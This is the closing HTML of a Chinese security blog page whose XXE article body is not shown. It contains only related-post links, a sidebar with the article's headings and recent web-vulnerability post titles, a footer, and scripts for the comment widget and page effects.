class="title">干货：SQL注入如何绕过WAF</div></div></a></div><div><a href="/2020/11/28/服务端请求伪造-SSRF/" title="服务器端请求伪造-SSRF"><img class="cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F27a30abf3c1075c2dcff9371a6d8905e.png&refer=http%3A%2F%2Fimg-blog.csdnimg.cn&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630914926&t=2db2045c1dd34b138e02c2edd50efca7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-28</div><div class="title">服务器端请求伪造-SSRF</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_match%2F0%2F12039801160%2F0.jpg&amp;refer=http%3A%2F%2Finews.gtimg.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630728108&amp;t=1576409e5f212dd7279b9a1c880c7086" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">jasson</div><div class="author-info__description">专注于Web、内网渗透、红蓝攻防、代码审计，分享知识，分享生活。</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">62</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/j-jasson2"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE"><span class="toc-number">2.</span> <span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">3.</span> <span class="toc-text">XML外部实体注入攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%87%E5%87%86%E7%9A%84XXE%E6%94%BB%E5%87%BBpayload"><span class="toc-number">4.</span> <span class="toc-text">标准的XXE攻击payload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">xxe</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%91%E6%98%AF%E8%BF%99%E6%A0%B7%E7%90%86%E8%A7%A3XXE%E6%BC%8F%E6%B4%9E%E7%9A%84%EF%BC%9A"><span class="toc-number">6.</span> <span class="toc-text">我是这样理解XXE漏洞的：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E5%87%BA%E5%8F%91%E7%90%86%E8%A7%A3XXE%EF%BC%9A"><span class="toc-number">7.</span> <span class="toc-text">从代码层面出发理解XXE：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">8.</span> <span class="toc-text">XXE无回显</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E6%BC%94%E7%A4%BA%EF%BC%9A"><span class="toc-number">9.</span> <span class="toc-text">实战演示：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">10.</span> <span class="toc-text">防御方法：</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/10/23/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E6%9C%89%E6%95%88%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="无题"><img src="/img/12.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2021/10/23/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E6%9C%89%E6%95%88%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="无题">无题</a><time datetime="2021-10-23T09:23:19.385Z" title="发表于 2021-10-23 17:23:19">2021-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/07/Nginx%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8Badd_header%E8%A2%AB%E8%A6%86%E7%9B%96/" title="Nginx中间件漏洞之add_header被覆盖"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F3778244-65c62b2e2775b20a.png%3FimageMogr2%2Fauto-orient%2Fstrip%257CimageView2%2F2%2Fw%2F1240&amp;refer=http%3A%2F%2Fupload-images.jianshu.io&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630941831&amp;t=6d3fe55cc7cb43085f42e676981de631" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nginx中间件漏洞之add_header被覆盖"/></a><div class="content"><a class="title" href="/2021/08/07/Nginx%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8Badd_header%E8%A2%AB%E8%A6%86%E7%9B%96/" title="Nginx中间件漏洞之add_header被覆盖">Nginx中间件漏洞之add_header被覆盖</a><time datetime="2021-08-07T01:45:41.000Z" title="发表于 2021-08-07 09:45:41">2021-08-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/06/Nginx%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8B%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/" title="Nginx中间件漏洞之目录穿越"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F3778244-65c62b2e2775b20a.png%3FimageMogr2%2Fauto-orient%2Fstrip%257CimageView2%2F2%2Fw%2F1240&amp;refer=http%3A%2F%2Fupload-images.jianshu.io&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630941831&amp;t=6d3fe55cc7cb43085f42e676981de631" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nginx中间件漏洞之目录穿越"/></a><div class="content"><a class="title" href="/2021/08/06/Nginx%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8B%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/" title="Nginx中间件漏洞之目录穿越">Nginx中间件漏洞之目录穿越</a><time datetime="2021-08-06T01:45:41.000Z" title="发表于 2021-08-06 09:45:41">2021-08-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/05/Nginx%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BCRLF%E6%B3%A8%E5%85%A5/" title="Nginx中间件漏洞之CRLF注入"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F3778244-65c62b2e2775b20a.png%3FimageMogr2%2Fauto-orient%2Fstrip%257CimageView2%2F2%2Fw%2F1240&amp;refer=http%3A%2F%2Fupload-images.jianshu.io&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630941831&amp;t=6d3fe55cc7cb43085f42e676981de631" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nginx中间件漏洞之CRLF注入"/></a><div class="content"><a class="title" href="/2021/08/05/Nginx%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BCRLF%E6%B3%A8%E5%85%A5/" title="Nginx中间件漏洞之CRLF注入">Nginx中间件漏洞之CRLF注入</a><time datetime="2021-08-05T01:45:41.000Z" title="发表于 2021-08-05 09:45:41">2021-08-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/03/%E6%9F%90cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1RCE&amp;%E8%89%B0%E9%9A%BEbypass(%E6%80%9D%E8%B7%AF%E6%B8%85%E5%A5%87)/" title="某cms代码审计RCE&amp;艰难bypass(思路清奇)"><img src="https://img0.baidu.com/it/u=751296986,1439230770&amp;fm=253&amp;fmt=auto&amp;app=120&amp;f=JPEG?w=650&amp;h=407" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="某cms代码审计RCE&amp;艰难bypass(思路清奇)"/></a><div class="content"><a class="title" href="/2021/08/03/%E6%9F%90cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1RCE&amp;%E8%89%B0%E9%9A%BEbypass(%E6%80%9D%E8%B7%AF%E6%B8%85%E5%A5%87)/" title="某cms代码审计RCE&amp;艰难bypass(思路清奇)">某cms代码审计RCE&amp;艰难bypass(思路清奇)</a><time datetime="2021-08-03T08:20:43.038Z" title="发表于 2021-08-03 16:20:43">2021-08-03</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021  <i id="heartbeat" class="fa fas fa-heartbeat"></i> jasson</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><p><a style="margin-inline:5px"target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为 Hexo" alt="HEXO"></a><a style="margin-inline:5px"target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用 Butterfly" alt="Butterfly"></a><a style="margin-inline:5px"target="_blank" href="https://www.jsdelivr.com/"><img src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用 Jsdelivr 为静态资源提供CDN加速" alt="Jsdelivr"></a><a style="margin-inline:5px"target="_blank" href="https://github.com/"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由 GitHub 托管" alt="GitHub"></a><a style="margin-inline:5px"target="_blank"href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" alt="img" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'ezr37wKgCkQA0GoJHntOvgbB-MdYXbMMI',
+      appKey: '7waFMOWmYb026lMWzexxu7RF',
+      placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script defer src="/live2d-widget/autoload.js"></script><script defer src="/js/phone.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="true" data-text="富强,明主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
